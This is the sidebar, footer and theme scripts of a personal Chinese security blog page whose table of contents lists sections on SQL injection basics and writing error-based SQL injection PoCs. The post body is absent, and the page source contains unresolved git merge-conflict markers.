    <div class="sidebar-inner">

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/avatar.jpg" alt="Medici.Yan" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Medici.Yan</p>
        </div>
        <p class="site-description motion-element" itemprop="description">不是路人甲的闲人丁,娱乐型选手</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
<<<<<<< HEAD
              <span class="site-state-item-count">26</span>
=======
              <span class="site-state-item-count">25</span>
>>>>>>> github/master
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            <a href="/categories">
<<<<<<< HEAD
              <span class="site-state-item-count">13</span>
=======
              <span class="site-state-item-count">12</span>
>>>>>>> github/master
              <span class="site-state-item-name">分类</span>
              </a>
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
<<<<<<< HEAD
              <span class="site-state-item-count">24</span>
=======
              <span class="site-state-item-count">23</span>
>>>>>>> github/master
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/medicean" target="_blank">Weibo</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://github.com/medicean" target="_blank">GitHub</a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
            <p class="site-author-name">Friends</p>
            
              <span class="links-of-author-item">
              <a href="http://antoor.github.io" target="_blank">蚁逅</a>
              </span>
            
              <span class="links-of-author-item">
              <a href="http://blog.l1n3.net" target="_blank">LinE</a>
              </span>
            
          
        </div>

      </section>

      
        <section class="post-toc-wrap sidebar-panel-active">
          <div class="post-toc-indicator-top post-toc-indicator"></div>
          <div class="post-toc">
            
            
<<<<<<< HEAD
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-SQL-注入基础"><span class="nav-number">1.</span> <span class="nav-text">2.1 SQL 注入基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-1-SQL-注入原理"><span class="nav-number">1.1.</span> <span class="nav-text">2.1.1 SQL 注入原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-2-SQL-注入分类"><span class="nav-number">1.2.</span> <span class="nav-text">2.1.2 SQL 注入分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#按照注入点类型来分类"><span class="nav-number">1.2.1.</span> <span class="nav-text">按照注入点类型来分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#按照数据提交的方式来分类"><span class="nav-number">1.2.2.</span> <span class="nav-text">按照数据提交的方式来分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#按照执行效果来分类"><span class="nav-number">1.2.3.</span> <span class="nav-text">按照执行效果来分类</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-基于报错的-SQL-注入-PoC-编写"><span class="nav-number">2.</span> <span class="nav-text">2.2 基于报错的 SQL 注入 PoC 编写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-1-漏洞分析"><span class="nav-number">2.1.</span> <span class="nav-text">2.2.1 漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-2-漏洞复现"><span class="nav-number">2.2.</span> <span class="nav-text">2.2.2 漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-3-无框架-PoC-编写"><span class="nav-number">2.3.</span> <span class="nav-text">2.2.3 无框架 PoC 编写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-4-基于-Pocsuite-框架"><span class="nav-number">2.4.</span> <span class="nav-text">2.2.4 基于 Pocsuite 框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-5-基于-Bugscan-框架"><span class="nav-number">2.5.</span> <span class="nav-text">2.2.5 基于 Bugscan 框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-6-总结"><span class="nav-number">2.6.</span> <span class="nav-text">2.2.6 总结</span></a></li></ol></li></ol></div>
=======
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1_SQL_注入基础"><span class="nav-number">1.</span> <span class="nav-text">2.1 SQL 注入基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-1_SQL_注入原理"><span class="nav-number">1.1.</span> <span class="nav-text">2.1.1 SQL 注入原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-2_SQL_注入分类"><span class="nav-number">1.2.</span> <span class="nav-text">2.1.2 SQL 注入分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#按照注入点类型来分类"><span class="nav-number">1.2.1.</span> <span class="nav-text">按照注入点类型来分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#按照数据提交的方式来分类"><span class="nav-number">1.2.2.</span> <span class="nav-text">按照数据提交的方式来分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#按照执行效果来分类"><span class="nav-number">1.2.3.</span> <span class="nav-text">按照执行效果来分类</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2_基于报错的_SQL_注入_PoC_编写"><span class="nav-number">2.</span> <span class="nav-text">2.2 基于报错的 SQL 注入 PoC 编写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-1_漏洞分析"><span class="nav-number">2.1.</span> <span class="nav-text">2.2.1 漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-2_漏洞复现"><span class="nav-number">2.2.</span> <span class="nav-text">2.2.2 漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-3_无框架_PoC_编写"><span class="nav-number">2.3.</span> <span class="nav-text">2.2.3 无框架 PoC 编写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-4_基于_Pocsuite_框架"><span class="nav-number">2.4.</span> <span class="nav-text">2.2.4 基于 Pocsuite 框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-5_基于_Bugscan_框架"><span class="nav-number">2.5.</span> <span class="nav-text">2.2.5 基于 Bugscan 框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-6_总结"><span class="nav-number">2.6.</span> <span class="nav-text">2.2.6 总结</span></a></li></ol></li></ol></div>
>>>>>>> github/master
            
          </div>
          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
        </section>
      

    </div>
  </aside>


    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner"> <div class="copyright" >
  
  &copy; &nbsp;  2015 - 
  <span itemprop="copyrightYear">2016</span>
  <span class="with-love">
    <i class="icon-next-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Medici.Yan</span>
</div>


 </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  
  
    

  
    
  

  <script type="text/javascript">
    var duoshuoQuery = {short_name:"medicean"};
    (function() {
      var ds = document.createElement('script');
      ds.type = 'text/javascript';ds.async = true;
      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
      ds.charset = 'UTF-8';
      (document.getElementsByTagName('head')[0]
      || document.getElementsByTagName('body')[0]).appendChild(ds);
    })();
  </script>
    
     

    
  
  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
  

  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>




  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  
<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>


<script type="text/javascript" id="sidebar.toc.highlight">
  $(document).ready(function () {
    var tocSelector = '.post-toc';
    var $tocSelector = $(tocSelector);
    var activeCurrentSelector = '.active-current';

    $tocSelector
      .on('activate.bs.scrollspy', function () {
        var $currentActiveElement = $(tocSelector + ' .active').last();

        removeCurrentActiveClass();
        $currentActiveElement.addClass('active-current');

        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
      })
      .on('clear.bs.scrollspy', function () {
        removeCurrentActiveClass();
      });

    function removeCurrentActiveClass () {
      $(tocSelector + ' ' + activeCurrentSelector)
        .removeClass(activeCurrentSelector.substring(1));
    }

    function processTOC () {
      getTOCMaxHeight();
      toggleTOCOverflowIndicators();
    }

    function getTOCMaxHeight () {
      var height = $('.sidebar').height() -
                   $tocSelector.position().top -
                   $('.post-toc-indicator-bottom').height();

      $tocSelector.css('height', height);

      return height;
    }

    function toggleTOCOverflowIndicators () {
      tocOverflowIndicator(
        '.post-toc-indicator-top',
        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
      );

      tocOverflowIndicator(
        '.post-toc-indicator-bottom',
        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
      )
    }

    $(document).on('sidebar.motion.complete', function () {
      processTOC();
    });

    $('body').scrollspy({ target: tocSelector });
    $(window).on('resize', function () {
      if ( $('.sidebar').hasClass('sidebar-active') ) {
        processTOC();
      }
    });

    onScroll($tocSelector);

    function onScroll (element) {
      element.on('mousewheel DOMMouseScroll', function (event) {
          var oe = event.originalEvent;
          var delta = oe.wheelDelta || -oe.detail;

          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
          event.preventDefault();

          toggleTOCOverflowIndicators();
      });
    }

    function tocOverflowIndicator (indicator, action) {
      var $indicator = $(indicator);
      var opacity = action === 'show' ? 0.4 : 0;
      $indicator.velocity ?
        $indicator.velocity('stop').velocity({
          opacity: opacity
        }, { duration: 100 }) :
        $indicator.stop().animate({
          opacity: opacity
        }, 100);
    }

  });
</script>

<script type="text/javascript" id="sidebar.nav">
  $(document).ready(function () {
    var html = $('html');
    var TAB_ANIMATE_DURATION = 200;
    var hasVelocity = $.isFunction(html.velocity);

    $('.sidebar-nav li').on('click', function () {
      var item = $(this);
      var activeTabClassName = 'sidebar-nav-active';
      var activePanelClassName = 'sidebar-panel-active';
      if (item.hasClass(activeTabClassName)) {
        return;
      }

      var currentTarget = $('.' + activePanelClassName);
      var target = $('.' + item.data('target'));

      hasVelocity ?
        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
          target
            .velocity('stop')
            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
            .addClass(activePanelClassName);
        }) :
        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
          currentTarget.hide();
          target
            .stop()
            .css({'opacity': 0, 'display': 'block'})
            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
              currentTarget.removeClass(activePanelClassName);
              target.addClass(activePanelClassName);
            });
        });

      item.siblings().removeClass(activeTabClassName);
      item.addClass(activeTabClassName);
    });

    $('.post-toc a').on('click', function (e) {
      e.preventDefault();
      var targetSelector = escapeSelector(this.getAttribute('href'));
      var offset = $(targetSelector).offset().top;
      hasVelocity ?
        html.velocity('stop').velocity('scroll', {
          offset: offset  + 'px',
          mobileHA: false
        }) :
        $('html, body').stop().animate({
          scrollTop: offset
        }, 500);
    });

    // Expand sidebar on post detail page by default, when post has a toc.
    var $tocContent = $('.post-toc-content');
    if (isDesktop() && CONFIG.sidebar === 'post') {
      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
        displaySidebar();
      }
    }
  });
</script>



  <script type="text/javascript">
    $(document).ready(function () {
      if (CONFIG.sidebar === 'always') {
        displaySidebar();
      }
      if (isMobile()) {
        FastClick.attach(document.body);
      }
    });
  </script>

  

  
  

  
  <script type="text/javascript" src="/js/lazyload.js"></script>
  <script type="text/javascript">
    $(function () {
      $("#posts").find('img').lazyload({
        placeholder: "/images/loading.gif",
        effect: "fadeIn"
      });
    });
  </script>
</body>
</html>
